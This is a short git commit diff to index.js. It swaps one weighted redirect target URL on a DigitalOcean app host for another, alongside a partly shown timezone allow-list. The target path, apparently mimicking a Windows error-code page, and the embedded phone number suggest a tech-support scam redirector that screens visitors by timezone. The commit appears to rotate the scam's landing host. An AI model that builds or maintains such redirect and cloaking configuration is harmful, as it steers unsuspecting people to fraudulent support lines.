9ec3a15611021139e34cf1e0697ba7fd1cc37ff6
paalakash <palaksh452@gmail.com>
2026-06-14 13:50:23 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://seashell-app-sde3v.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3420", weight: 1.0 }
+    { url: "https://seahorse-app-8kudo.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3420", weight: 1.0 }
 
 ];
 
